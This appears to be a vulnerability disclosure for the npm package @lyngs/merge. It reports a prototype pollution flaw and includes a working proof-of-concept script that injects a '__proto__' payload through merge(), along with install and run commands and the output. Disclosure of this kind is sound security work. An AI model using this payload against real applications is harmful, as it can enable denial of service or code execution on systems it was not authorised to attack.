# Description

@lyngs/merge provides a function for user to merge value, just like Object.assign() did. But the difference is merge() will literally merge every layers of params.
This package is vulnerable to `Prototype Pollution`.
This package fails to restrict access to prototypes of objects, allowing for modification of prototype behavior using a `proto` payload, which may result in Sensitive Information Disclosure/Denial of Service(DoS)/Remote Code Execution.


# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var merge = require("@lyngs/merge")
obj = {}
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
console.log("Before : " + obj.polluted);
merge.merge(obj,payload)
console.log("After : " + obj.polluted);

```
2. Execute the following commands in another terminal:

```
npm install @lyngs/merge # Install affected module
node poc.js #  Run the PoC
```
3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
